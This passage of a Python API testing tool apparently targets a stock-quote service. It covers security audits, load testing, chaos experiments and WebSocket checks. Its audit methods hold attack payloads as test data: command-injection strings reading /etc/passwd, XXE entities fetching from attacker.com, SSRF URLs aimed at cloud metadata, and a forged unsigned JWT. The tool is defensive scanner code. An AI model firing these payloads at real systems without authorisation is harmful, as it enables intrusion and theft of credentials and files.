            ('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
             'Key ID injection'),
        ]
        
        for token, description in test_tokens:
            headers = {'Authorization': f'Bearer {token}'}
            status, data, _, _, _ = await client.get(
                '/v1/enriched/quote', 
                headers=headers, 
                params={'symbol': 'AAPL'}
            )
            
            if status == 200:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.CRYPTOGRAPHIC_FAILURES,
                    severity=TestSeverity.CRITICAL,
                    endpoint='/v1/enriched/quote',
                    description=f'JWT vulnerability: {description}',
                    remediation='Use strong secrets, validate algorithms, set proper expiration',
                    evidence={'token': token[:20] + '...'},
                    owasp_category=VulnerabilityType.CRYPTOGRAPHIC_FAILURES
                ))
                break
        
        # Test JWT header injection
        try:
            # Create token with alg: none in header
            header = base64.urlsafe_b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()).decode().rstrip('=')
            payload = base64.urlsafe_b64encode(json.dumps({'sub': 'admin', 'admin': True}).encode()).decode().rstrip('=')
            token = f"{header}.{payload}."
            
            headers = {'Authorization': f'Bearer {token}'}
            status, data, _, _, _ = await client.get('/v1/admin', headers=headers)
            
            if status == 200:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.CRYPTOGRAPHIC_FAILURES,
                    severity=TestSeverity.CRITICAL,
                    endpoint='/v1/admin',
                    description='JWT with "none" algorithm accepted',
                    remediation='Reject tokens with "none" algorithm',
                    owasp_category=VulnerabilityType.CRYPTOGRAPHIC_FAILURES
                ))
        except:
            pass
        
        return vulns
    
    async def audit_ssl_tls(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Audit SSL/TLS configuration (OWASP A02:2021)"""
        vulns = []
        
        if not PYOPENSSL_AVAILABLE:
            return vulns
        
        try:
            hostname = urlparse(self.base_url).hostname
            port = urlparse(self.base_url).port or 443
            
            # Check SSL certificate
            cert = ssl.get_server_certificate((hostname, port))
            x509 = crypto.load_certificate(crypto.FILETYPE_PEM, cert)
            
            # Check expiration
            not_after = x509.get_notAfter().decode('ascii')
            expiry = datetime.strptime(not_after, '%Y%m%d%H%M%SZ').replace(tzinfo=timezone.utc)
            days_left = (expiry - datetime.now(timezone.utc)).days
            
            if days_left < 30:
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.CRYPTOGRAPHIC_FAILURES,
                    severity=TestSeverity.HIGH if days_left < 7 else TestSeverity.MEDIUM,
                    endpoint='/',
                    description=f'SSL certificate expires in {days_left} days',
                    remediation='Renew certificate before expiration',
                    evidence={'expiry': expiry.isoformat(), 'days_left': days_left},
                    owasp_category=VulnerabilityType.CRYPTOGRAPHIC_FAILURES
                ))
            
            # Check issuer
            issuer = x509.get_issuer()
            if 'Let\'s Encrypt' in str(issuer):
                # Let's Encrypt is fine, but note it
                pass
            elif not any(ca in str(issuer) for ca in ['DigiCert', 'GlobalSign', 'Sectigo', 'GoDaddy']):
                vulns.append(SecurityVulnerability(
                    type=VulnerabilityType.CRYPTOGRAPHIC_FAILURES,
                    severity=TestSeverity.LOW,
                    endpoint='/',
                    description='Certificate from untrusted CA',
                    remediation='Use certificates from trusted Certificate Authorities',
                    evidence={'issuer': str(issuer)},
                    owasp_category=VulnerabilityType.CRYPTOGRAPHIC_FAILURES
                ))
            
            # Check protocol versions
            contexts = {
                'TLSv1.0': ssl.PROTOCOL_TLSv1 if hasattr(ssl, 'PROTOCOL_TLSv1') else None,
                'TLSv1.1': ssl.PROTOCOL_TLSv1_1 if hasattr(ssl, 'PROTOCOL_TLSv1_1') else None,
                'TLSv1.2': ssl.PROTOCOL_TLSv1_2 if hasattr(ssl, 'PROTOCOL_TLSv1_2') else None,
                'TLSv1.3': ssl.PROTOCOL_TLSv1_3 if hasattr(ssl, 'PROTOCOL_TLSv1_3') else None,
            }
            
            for version, protocol in contexts.items():
                if protocol:
                    try:
                        context = ssl.SSLContext(protocol)
                        with socket.create_connection((hostname, port), timeout=5) as sock:
                            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                                # Connection successful
                                if version in ['TLSv1.0', 'TLSv1.1']:
                                    vulns.append(SecurityVulnerability(
                                        type=VulnerabilityType.CRYPTOGRAPHIC_FAILURES,
                                        severity=TestSeverity.HIGH,
                                        endpoint='/',
                                        description=f'Outdated TLS version supported: {version}',
                                        remediation='Disable TLS 1.0 and 1.1, use TLS 1.2 or higher',
                                        evidence={'version': version},
                                        owasp_category=VulnerabilityType.CRYPTOGRAPHIC_FAILURES
                                    ))
                    except:
                        pass
            
        except Exception as e:
            logger.warning(f"SSL/TLS audit failed: {e}")
        
        return vulns
    
    async def audit_command_injection(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Test for command injection vulnerabilities"""
        vulns = []
        
        payloads = [
            ('; ls', 'Basic command'),
            ('| dir', 'Pipe command'),
            ('& whoami', 'Background command'),
            ('&& cat /etc/passwd', 'Conditional'),
            ('|| echo vulnerable', 'OR conditional'),
            ('`id`', 'Backticks'),
            ('$(uname -a)', 'Command substitution'),
            ('; sleep 5', 'Time-based'),
            ('| sleep 5', 'Time-based pipe'),
            ('& sleep 5 &', 'Background sleep'),
        ]
        
        for payload, description in payloads:
            start_time = time.time()
            status, data, duration, _, _ = await client.get(
                '/v1/enriched/quote',
                params={'symbol': payload}
            )
            
            # Check for time-based injection
            if any(cmd in payload for cmd in ['sleep', 'ping', 'timeout']):
                if duration > 4:
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.INJECTION,
                        severity=TestSeverity.CRITICAL,
                        endpoint='/v1/enriched/quote',
                        description=f'Command injection vulnerability: {description}',
                        remediation='Use safe APIs, validate and sanitize all inputs',
                        evidence={'payload': payload, 'delay': duration},
                        owasp_category=VulnerabilityType.INJECTION
                    ))
                    break
            
            # Check for command output in response
            if isinstance(data, str):
                cmd_outputs = ['uid=', 'gid=', 'root:', '/bin/', 'usr/bin', 'windows', 'linux']
                if any(out in data.lower() for out in cmd_outputs):
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.INJECTION,
                        severity=TestSeverity.CRITICAL,
                        endpoint='/v1/enriched/quote',
                        description=f'Command output detected in response: {description}',
                        remediation='Use safe APIs, never pass user input to system commands',
                        evidence={'payload': payload},
                        owasp_category=VulnerabilityType.INJECTION
                    ))
                    break
        
        return vulns
    
    async def audit_xxe(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Test for XXE (XML External Entity) injection"""
        vulns = []
        
        # XML payloads for XXE testing
        xml_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
             'File read'),
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
             'External DTD'),
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><root/>',
             'PHP filter'),
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "jar:http://attacker.com/xxe.jar!xxe.dtd">%remote;]><root/>',
             'JAR protocol'),
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "expect://id">%remote;]><root/>',
             'Expect extension'),
        ]
        
        for payload, description in xml_payloads:
            # Try to send XML
            headers = {'Content-Type': 'application/xml'}
            status, data, _, _, _ = await client.post(
                '/v1/parse',
                data=payload,
                headers=headers
            )
            
            if status == 200:
                # Check for file contents in response
                if isinstance(data, str):
                    if 'root:' in data or 'daemon:' in data or 'nobody:' in data:
                        vulns.append(SecurityVulnerability(
                            type=VulnerabilityType.INJECTION,
                            severity=TestSeverity.CRITICAL,
                            endpoint='/v1/parse',
                            description=f'XXE vulnerability detected: {description}',
                            remediation='Disable XML external entity processing',
                            evidence={'payload': payload[:100] + '...'},
                            owasp_category=VulnerabilityType.INJECTION
                        ))
                        break
        
        return vulns
    
    async def audit_ssrf(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Test for SSRF (Server-Side Request Forgery) vulnerabilities"""
        vulns = []
        
        # Test SSRF via URL parameters
        test_urls = [
            ('http://169.254.169.254/latest/meta-data/', 'AWS metadata'),
            ('http://169.254.169.254/latest/user-data/', 'AWS user-data'),
            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP metadata'),
            ('http://127.0.0.1:80', 'Localhost'),
            ('http://localhost:8080', 'Localhost port'),
            ('http://[::1]:80', 'IPv6 localhost'),
            ('http://0.0.0.0:80', 'All interfaces'),
            ('http://10.0.0.1', 'Private network'),
            ('http://172.16.0.1', 'Private network'),
            ('http://192.168.1.1', 'Private network'),
            ('file:///etc/passwd', 'File protocol'),
            ('gopher://localhost:8080/_GET / HTTP/1.0', 'Gopher protocol'),
            ('dict://localhost:11211/', 'Dict protocol'),
            ('ftp://localhost:21/', 'FTP protocol'),
            ('http://localhost:5432', 'PostgreSQL'),
            ('http://localhost:6379', 'Redis'),
            ('http://localhost:9200', 'Elasticsearch'),
            ('http://localhost:27017', 'MongoDB'),
        ]
        
        for test_url, description in test_urls:
            status, data, _, _, _ = await client.get(
                '/v1/fetch',
                params={'url': test_url}
            )
            
            if status == 200:
                # Check for metadata in response
                if isinstance(data, str):
                    metadata_indicators = [
                        'instance-id', 'ami-id', 'public-keys', 'security-credentials',
                        'project-id', 'zone', 'hostname', 'ssh-keys'
                    ]
                    if any(ind in data for ind in metadata_indicators):
                        vulns.append(SecurityVulnerability(
                            type=VulnerabilityType.SSRF,
                            severity=TestSeverity.CRITICAL,
                            endpoint='/v1/fetch',
                            description=f'SSRF vulnerability: {description} accessible',
                            remediation='Implement URL whitelisting, validate and sanitize URLs',
                            evidence={'url': test_url},
                            owasp_category=VulnerabilityType.SSRF
                        ))
                        break
        
        return vulns
    
    async def audit_mass_assignment(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Test for mass assignment vulnerabilities (OWASP API6:2019)"""
        vulns = []
        
        # Test payload with extra fields
        base_payload = {
            'symbol': 'AAPL',
            'quantity': 10,
            'price': 150.0
        }
        
        # Extra fields that might affect security
        extra_fields = [
            {'is_admin': True},
            {'role': 'admin'},
            {'permissions': ['*']},
            {'approved': True},
            {'verified': True},
            {'balance': 1000000},
            {'credit_limit': 999999},
            {'account_type': 'premium'},
            {'discount_rate': 0.5},
            {'override': True},
            {'skip_validation': True},
            {'bypass_check': True},
        ]
        
        for extra in extra_fields:
            payload = {**base_payload, **extra}
            
            status, data, _, _, _ = await client.post(
                '/v1/orders',
                json=payload
            )
            
            if status == 200 or status == 201:
                # Check if extra fields were processed
                if isinstance(data, dict):
                    for field in extra:
                        if field in data and data[field] == extra[field]:
                            vulns.append(SecurityVulnerability(
                                type=VulnerabilityType.MASS_ASSIGNMENT,
                                severity=TestSeverity.HIGH,
                                endpoint='/v1/orders',
                                description=f'Mass assignment vulnerability: field "{field}" accepted',
                                remediation='Use allowlists for mass assignment, never accept all fields',
                                evidence={'field': field, 'value': extra[field]},
                                owasp_category=VulnerabilityType.MASS_ASSIGNMENT
                            ))
                            break
                else:
                    # Success response might indicate acceptance
                    vulns.append(SecurityVulnerability(
                        type=VulnerabilityType.MASS_ASSIGNMENT,
                        severity=TestSeverity.MEDIUM,
                        endpoint='/v1/orders',
                        description='Possible mass assignment vulnerability',
                        remediation='Use allowlists for mass assignment',
                        evidence={'payload': payload},
                        owasp_category=VulnerabilityType.MASS_ASSIGNMENT
                    ))
        
        return vulns
    
    async def run_full_audit(self, client: AsyncHTTPClient) -> List[SecurityVulnerability]:
        """Run complete security audit with all checks"""
        all_vulns = []
        
        audit_functions = [
            self.audit_headers,
            self.audit_authentication,
            self.audit_authorization,
            self.audit_rate_limiting,
            self.audit_sql_injection,
            self.audit_xss,
            self.audit_cors,
            self.audit_jwt,
            self.audit_ssl_tls,
            self.audit_command_injection,
            self.audit_xxe,
            self.audit_ssrf,
            self.audit_mass_assignment,
        ]
        
        for audit_func in audit_functions:
            try:
                vulns = await audit_func(client)
                all_vulns.extend(vulns)
                
                # Log findings
                for v in vulns:
                    logger.warning(f"Security: {v.severity.value.upper()} - {v.description}")
                    
            except Exception as e:
                logger.error(f"Security audit {audit_func.__name__} failed: {e}")
        
        self.vulnerabilities = all_vulns
        return all_vulns

# =============================================================================
# Load Testing (Locust Integration)
# =============================================================================
if LOCUST_AVAILABLE:
    class APIUser(HttpUser):
        """Locust user for load testing"""
        
        wait_time = between(1, 3)
        host = "http://localhost:8000"
        
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.token = os.getenv('APP_TOKEN')
            self.headers = {
                'User-Agent': f'TFB-LoadTest/{SCRIPT_VERSION}',
                'Accept': 'application/json'
            }
            if self.token:
                self.headers['X-APP-TOKEN'] = self.token
                self.headers['Authorization'] = f'Bearer {self.token}'
        
        def on_start(self):
            """Setup on test start"""
            logger.info(f"User {self.id} started")
        
        def on_stop(self):
            """Cleanup on test stop"""
            logger.debug(f"User {self.id} stopped")
        
        @task(10)
        def get_quote(self):
            """Get single quote"""
            symbols = ['AAPL', 'MSFT', 'GOOGL', '1120.SR', '2222.SR', 'TSLA', 'AMZN', 'META']
            symbol = random.choice(symbols)
            
            with self.client.get(
                f"/v1/enriched/quote",
                params={'symbol': symbol},
                headers=self.headers,
                catch_response=True
            ) as response:
                if response.status_code == 200:
                    response.success()
                elif response.status_code == 429:
                    # Rate limited, still success for load test
                    response.success()
                else:
                    response.failure(f"Unexpected status: {response.status_code}")
        
        @task(5)
        def get_batch_quotes(self):
            """Get batch quotes"""
            symbols = random.sample(['AAPL', 'MSFT', 'GOOGL', 'TSLA', 'AMZN'], 3)
            params = [('tickers', s) for s in symbols]
            
            with self.client.get(
                "/v1/enriched/quotes",
                params=params,
                headers=self.headers,
                catch_response=True
            ) as response:
                if response.status_code == 200:
                    response.success()
                else:
                    response.failure(f"Unexpected status: {response.status_code}")
        
        @task(3)
        def get_analysis(self):
            """Get analysis"""
            symbols = random.sample(['AAPL', 'MSFT', 'GOOGL'], 2)
            
            with self.client.post(
                "/v1/analysis/quotes",
                json={'tickers': symbols},
                headers=self.headers,
                catch_response=True
            ) as response:
                if response.status_code == 200:
                    response.success()
                else:
                    response.failure(f"Unexpected status: {response.status_code}")
        
        @task(1)
        def get_advisor_recs(self):
            """Get advisor recommendations"""
            payload = {
                'tickers': random.sample(['AAPL', 'MSFT', 'GOOGL', 'TSLA'], 2),
                'risk': random.choice(['Low', 'Moderate', 'High']),
                'top_n': random.randint(3, 8)
            }
            
            with self.client.post(
                "/v1/advisor/recommendations",
                json=payload,
                headers=self.headers,
                catch_response=True
            ) as response:
                if response.status_code == 200:
                    response.success()
                else:
                    response.failure(f"Unexpected status: {response.status_code}")
        
        @task(2)
        def get_health(self):
            """Check health"""
            with self.client.get(
                "/health",
                headers=self.headers,
                catch_response=True
            ) as response:
                if response.status_code == 200:
                    response.success()
                else:
                    response.failure(f"Health check failed: {response.status_code}")

def run_locust_test(host: str, users: int, spawn_rate: int, run_time: str,
                    headless: bool = True) -> Dict[str, Any]:
    """Run Locust load test
    
    Args:
        host: Target host URL
        users: Number of users to simulate
        spawn_rate: Users spawned per second
        run_time: Test duration (e.g., '1m', '5m', '1h')
        headless: Run in headless mode
    
    Returns:
        Dictionary with test results
    """
    if not LOCUST_AVAILABLE:
        logger.error("Locust not available")
        return {}
    
    from locust import events
    
    # Parse run time
    match = re.match(r'(\d+)([smh])', run_time)
    if match:
        value, unit = match.groups()
        seconds = int(value) * {'s': 1, 'm': 60, 'h': 3600}[unit]
    else:
        seconds = 60
    
    # Setup environment
    env = Environment(user_classes=[APIUser], host=host)
    env.create_local_runner()
    
    # Setup stats
    if headless:
        import gevent
        web_ui = None
    else:
        env.create_web_ui("127.0.0.1", 8089)
    
    # Start test
    logger.info(f"Starting load test: {users} users, spawn rate {spawn_rate}/s, duration {run_time}")
    env.runner.start(users, spawn_rate=spawn_rate)
    
    # Run for specified duration
    gevent.spawn_later(seconds, lambda: env.runner.quit())
    
    # Wait for completion
    env.runner.greenlet.join()
    
    # Collect results
    stats = env.environment.stats
    
    # Calculate percentiles
    response_times = []
    for method, path in stats.entries:
        entry = stats.entries[(method, path)]
        if entry.num_requests > 0:
            response_times.extend([entry.avg_response_time] * entry.num_requests)
    
    percentiles = {}
    if response_times and NUMPY_AVAILABLE:
        percentiles = {
            'p50': np.percentile(response_times, 50),
            'p95': np.percentile(response_times, 95),
            'p99': np.percentile(response_times, 99),
            'p999': np.percentile(response_times, 99.9)
        }
    
    results = {
        'total_requests': stats.total.num_requests,
        'total_failures': stats.total.num_failures,
        'avg_response_time': stats.total.avg_response_time,
        'min_response_time': stats.total.min_response_time or 0,
        'max_response_time': stats.total.max_response_time or 0,
        'median_response_time': stats.total.median_response_time,
        'total_rps': stats.total.current_rps,
        'fail_per_second': stats.total.current_fail_per_sec,
        'percentiles': percentiles,
        'duration': seconds,
        'users': users,
        'spawn_rate': spawn_rate,
    }
    
    # Stop web UI if running
    if hasattr(env, 'web_ui') and env.web_ui:
        env.web_ui.stop()
    
    return results

# =============================================================================
# Chaos Engineering
# =============================================================================
class ChaosEngine:
    """Chaos engineering experiments for resilience testing"""
    
    def __init__(self, base_url: str, failure_rate: float = 0.1, 
                 latency_ms: int = 0, exception_rate: float = 0.0):
        self.base_url = base_url
        self.failure_rate = failure_rate
        self.latency_ms = latency_ms
        self.exception_rate = exception_rate
        self.experiments: List[Dict[str, Any]] = []
    
    async def inject_latency(self, client: AsyncHTTPClient, endpoint: str, 
                            duration: int = 60, target_latency_ms: Optional[int] = None) -> Dict[str, Any]:
        """Inject latency into endpoint
        
        Args:
            client: HTTP client
            endpoint: Endpoint to target
            duration: Experiment duration in seconds
            target_latency_ms: Target latency to inject (default: self.latency_ms)
        
        Returns:
            Experiment results
        """
        target_latency = target_latency_ms or self.latency_ms
        logger.warning(f"🔥 Injecting {target_latency}ms latency to {endpoint} for {duration}s")
        
        start = time.time()
        latencies = []
        statuses = []
        failures = 0
        total = 0
        
        while time.time() - start < duration:
            # Add artificial latency
            if target_latency > 0:
                await asyncio.sleep(target_latency / 1000)
            
            # Maybe fail
            if random.random() < self.failure_rate:
                failures += 1
                total += 1
                statuses.append(503)
                continue
            
            # Make request
            try:
                status, data, response_time, headers, _ = await client.get(
                    endpoint, 
                    params={'symbol': 'AAPL'},
                    timeout=30
                )
                latencies.append(response_time)
                statuses.append(status)
                
                if status != 200:
                    failures += 1
            except Exception as e:
                failures += 1
                statuses.append(500)
            
            total += 1
            
            # Small delay between requests
            await asyncio.sleep(0.1)
        
        # Calculate metrics
        success_rate = (total - failures) / total if total > 0 else 0
        
        return {
            'experiment': 'latency_injection',
            'endpoint': endpoint,
            'target_latency_ms': target_latency,
            'duration': duration,
            'total_requests': total,
            'failures': failures,
            'success_rate': success_rate,
            'failure_rate': failures / total if total > 0 else 0,
            'avg_response_time': sum(latencies) / len(latencies) if latencies else 0,
            'p95_response_time': np.percentile(latencies, 95) if latencies and NUMPY_AVAILABLE else 0,
            'status_distribution': dict(Counter(statuses)),
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
    
    async def inject_failures(self, client: AsyncHTTPClient, endpoint: str,
                             duration: int = 60, target_failure_rate: Optional[float] = None) -> Dict[str, Any]:
        """Inject random failures
        
        Args:
            client: HTTP client
            endpoint: Endpoint to target
            duration: Experiment duration in seconds
            target_failure_rate: Target failure rate (default: self.failure_rate)
        
        Returns:
            Experiment results
        """
        target_rate = target_failure_rate or self.failure_rate
        logger.warning(f"🔥 Injecting {target_rate*100:.1f}% failures to {endpoint} for {duration}s")
        
        start = time.time()
        responses = []
        statuses = []
        latencies = []
        
        while time.time() - start < duration:
            # Maybe return error
            if random.random() < target_rate:
                error_code = random.choice([500, 502, 503, 504, 429])
                responses.append(error_code)
                statuses.append(error_code)
                latencies.append(0.001)  # Minimal latency for failures
            else:
                try:
                    status, data, response_time, headers, _ = await client.get(
                        endpoint,
                        params={'symbol': 'AAPL'}
                    )
                    responses.append(status)
                    statuses.append(status)
                    latencies.append(response_time)
                except Exception as e:
                    responses.append(500)
                    statuses.append(500)
                    latencies.append(0.001)
            
            await asyncio.sleep(0.1)
        
        total = len(responses)
        failures = sum(1 for s in statuses if s != 200)
        success_rate = (total - failures) / total if total > 0 else 0
        
        return {
            'experiment': 'failure_injection',
            'endpoint': endpoint,
            'target_failure_rate': target_rate,
            'duration': duration,
            'total_requests': total,
            'failures': failures,
            'success_rate': success_rate,
            'actual_failure_rate': failures / total if total > 0 else 0,
            'avg_response_time': sum(latencies) / len(latencies) if latencies else 0,
            'status_distribution': dict(Counter(statuses)),
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
    
    async def test_circuit_breaker(self, client: AsyncHTTPClient, endpoint: str) -> Dict[str, Any]:
        """Test circuit breaker behavior
        
        Args:
            client: HTTP client
            endpoint: Endpoint to test
        
        Returns:
            Circuit breaker test results
        """
        logger.info(f"🔄 Testing circuit breaker for {endpoint}")
        
        results = {
            'endpoint': endpoint,
            'baseline': {},
            'failure_phase': {},
            'recovery_phase': {},
            'recovery_time': 0,
            'circuit_opens': 0,
            'circuit_closes': 0
        }
        
        # Baseline measurement
        logger.debug("Measuring baseline performance...")
        baseline_times = []
        for _ in range(20):
            try:
                _, _, rt, _, _ = await client.get(endpoint, params={'symbol': 'AAPL'})
                baseline_times.append(rt)
            except:
                pass
            await asyncio.sleep(0.1)
        
        if baseline_times:
            results['baseline'] = {
                'avg_response_time': sum(baseline_times) / len(baseline_times),
                'min_response_time': min(baseline_times),
                'max_response_time': max(baseline_times),
                'success_rate': 1.0
            }
        
        # Trigger failures to open circuit
        logger.debug("Triggering failures to open circuit...")
        failure_start = time.time()
        failure_times = []
        failure_statuses = []
        circuit_opened = False
        
        # Make many failing requests
        for i in range(50):
            try:
                # Use invalid endpoint or force failure
                status, _, rt, _, _ = await client.get('/invalid-endpoint-that-does-not-exist')
                failure_times.append(rt)
                failure_statuses.append(status)
                
                # Check if circuit opened (should get fast failures)
                if rt < 0.01 and i > 10 and not circuit_opened:
                    circuit_opened = True
                    results['circuit_opens'] += 1
                    logger.debug(f"Circuit likely opened after {i} failures")
            except Exception as e:
                failure_times.append(0.001)
                failure_statuses.append(500)
            
            await asyncio.sleep(0.05)
        
        failure_duration = time.time() - failure_start
        
        # Test during failures
        logger.debug("Testing during failure phase...")
        during_times = []
        during_failures = 0
        during_successes = 0
        
        for _ in range(30):
            try:
                status, _, rt, _, _ = await client.get(endpoint, params={'symbol': 'AAPL'})
                during_times.append(rt)
                if status == 200:
                    during_successes += 1
                else:
                    during_failures += 1
            except Exception:
                during_failures += 1
            await asyncio.sleep(0.1)
        
        results['failure_phase'] = {
            'requests': len(failure_times),
            'failures': len([s for s in failure_statuses if s != 200]),
            'avg_response_time': sum(failure_times) / len(failure_times) if failure_times else 0,
            'success_rate': during_successes / (during_successes + during_failures) if (during_successes + during_failures) > 0 else 0,
            'circuit_open': circuit_opened
        }
        
        # Wait for recovery
        logger.debug("Waiting for circuit recovery...")
        recovery_start = time.time()
        recovery_times = []
        recovery_successes = 0
        recovery_failures = 0
        circuit_closed = False
        
        # Stop injecting failures
        recovery_end = time.time() + 60  # Max wait 60 seconds
        
        while time.time() < recovery_end and not circuit_closed:
            try:
                status, _, rt, _, _ = await client.get(endpoint, params={'symbol': 'AAPL'})
                recovery_times.append(rt)
                
                if status == 200:
                    recovery_successes += 1
                    if recovery_successes >= 5 and not circuit_closed:
                        circuit_closed = True
                        results['circuit_closes'] += 1
                        results['recovery_time'] = time.time() - recovery_start
                        logger.debug(f"Circuit closed after {results['recovery_time']:.2f}s")
                else:
                    recovery_failures += 1
            except Exception:
                recovery_failures += 1
            
            await asyncio.sleep(0.5)
        
        results['recovery_phase'] = {
            'requests': len(recovery_times),
            'successes': recovery_successes,
            'failures': recovery_failures,
            'avg_response_time': sum(recovery_times) / len(recovery_times) if recovery_times else 0,
            'success_rate': recovery_successes / (recovery_successes + recovery_failures) if (recovery_successes + recovery_failures) > 0 else 0,
        }
        
        if not circuit_closed:
            results['recovery_time'] = None
            logger.warning("Circuit did not close within timeout")
        
        return results
    
    async def test_degraded_performance(self, client: AsyncHTTPClient, endpoint: str,
                                       duration: int = 60) -> Dict[str, Any]:
        """Test system behavior under degraded performance
        
        Args:
            client: HTTP client
            endpoint: Endpoint to test
            duration: Test duration in seconds
        
        Returns:
            Test results
        """
        logger.info(f"📉 Testing degraded performance for {endpoint}")
        
        # Gradual latency increase
        latencies = []
        statuses = []
        
        base_latency = self.latency_ms
        
        for i in range(10):
            # Gradually increase latency
            current_latency = base_latency * (i + 1) / 5
            logger.debug(f"Phase {i+1}: {current_latency:.0f}ms latency")
            
            phase_start = time.time()
            phase_latencies = []
            
            while time.time() - phase_start < duration / 10:
                # Inject latency
                if current_latency > 0:
                    await asyncio.sleep(current_latency / 1000)
                
                try:
                    status, _, rt, _, _ = await client.get(endpoint, params={'symbol': 'AAPL'})
                    latencies.append(rt)
                    statuses.append(status)
                    phase_latencies.append(rt)
                except Exception:
                    statuses.append(500)
                    latencies.append(5.0)  # Assume 5s timeout
                
                await asyncio.sleep(0.2)
            
            # Check if system started failing
            phase_success_rate = sum(1 for s in statuses[-len(phase_latencies):] if s == 200) / len(phase_latencies)
            logger.debug(f"  Success rate: {phase_success_rate*100:.1f}%")
        
        return {
            'experiment': 'degraded_performance',
            'endpoint': endpoint,
            'total_requests': len(latencies),
            'failures': sum(1 for s in statuses if s != 200),
            'success_rate': sum(1 for s in statuses if s == 200) / len(statuses) if statuses else 0,
            'avg_response_time': sum(latencies) / len(latencies) if latencies else 0,
            'p95_response_time': np.percentile(latencies, 95) if latencies and NUMPY_AVAILABLE else 0,
            'breakpoint_latency': self._find_breakpoint(latencies, statuses),
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
    
    def _find_breakpoint(self, latencies: List[float], statuses: List[int]) -> Optional[float]:
        """Find latency at which system starts failing"""
        if len(latencies) < 10:
            return None
        
        # Group by latency ranges
        latency_buckets = defaultdict(list)
        for lat, status in zip(latencies, statuses):
            bucket = int(lat * 10) / 10  # Round to 0.1s
            latency_buckets[bucket].append(status)
        
        # Find first bucket with >10% failures
        for bucket in sorted(latency_buckets.keys()):
            statuses_in_bucket = latency_buckets[bucket]
            failure_rate = sum(1 for s in statuses_in_bucket if s != 200) / len(statuses_in_bucket)
            if failure_rate > 0.1:
                return bucket
        
        return None
    
    async def run_all_experiments(self, client: AsyncHTTPClient, endpoint: str,
                                 duration: int = 60) -> Dict[str, Any]:
        """Run all chaos experiments
        
        Args:
            client: HTTP client
            endpoint: Endpoint to test
            duration: Duration for each experiment
        
        Returns:
            Combined results
        """
        results = {}
        
        # Circuit breaker test
        results['circuit_breaker'] = await self.test_circuit_breaker(client, endpoint)
        
        # Latency injection
        results['latency'] = await self.inject_latency(
            client, endpoint, duration=min(30, duration)
        )
        
        # Failure injection
        results['failures'] = await self.inject_failures(
            client, endpoint, duration=min(30, duration)
        )
        
        # Degraded performance
        results['degraded'] = await self.test_degraded_performance(
            client, endpoint, duration=min(30, duration)
        )
        
        self.experiments.append({
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'endpoint': endpoint,
            'results': results
        })
        
        return results

# =============================================================================
# WebSocket Tester
# =============================================================================
class WebSocketTester:
    """WebSocket endpoint tester for real-time feeds"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.replace('http', 'ws').replace('https', 'wss')
        self.token = os.getenv('APP_TOKEN')
    
    async def test_connection(self, path: str, duration: int = 30) -> Dict[str, Any]:
        """Test WebSocket connection
        
        Args:
            path: WebSocket endpoint path
            duration: Test duration in seconds
        
        Returns:
            Test results
        """
        if not WEBSOCKET_AVAILABLE:
            return {'error': 'WebSocket library not available'}
        
        url = urljoin(self.base_url, path.lstrip('/'))
        
        if self.token:
            separator = '&' if '?' in url else '?'
            url += f"{separator}token={self.token}"
        
        results = {
            'connected': False,
            'messages_received': 0,
            'messages_sent': 0,
            'latency_ms': [],
            'errors': [],
            'message_types': Counter(),
            'connection_time': 0,
            'reconnection_time': 0,
            'throughput': 0
        }
        
        start_time = time.time()
        messages = []
        
        try:
            # Connect
            connect_start = time.time()
            async with websockets.connect(url, timeout=10, ping_interval=20, ping_timeout=10) as ws:
                results['connection_time'] = (time.time() - connect_start) * 1000
                results['connected'] = True
                
                # Send ping messages
                for i in range(5):
                    msg_start = time.time()
                    await ws.send(json.dumps({'type': 'ping', 'id': i, 'timestamp': time.time()}))
                    results['messages_sent'] += 1
                    
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=5)
                        latency = (time.time() - msg_start) * 1000
                        results['latency_ms'].append(latency)
                        
                        data = json.loads(response)
                        if data.get('type') == 'pong':
                            results['messages_received'] += 1
                            results['message_types']['pong'] += 1
                            messages.append(data)
                    except asyncio.TimeoutError:
                        results['errors'].append('Timeout waiting for pong')
                    except Exception as e:
                        results['errors'].append(str(e))
                    
                    await asyncio.sleep(0.5)
                
                # Subscribe to updates
                symbols = ['AAPL', 'MSFT', '1120.SR', '2222.SR']
                await ws.send(json.dumps({
                    'type': 'subscribe',
                    'symbols': symbols,
                    'timestamp': time.time()
                }))
                results['messages_sent'] += 1
                
                # Wait for updates
                update_timeout = time.time() + 10
                updates_received = 0
                
                while time.time() < update_timeout and updates_received < 5:
                    try:
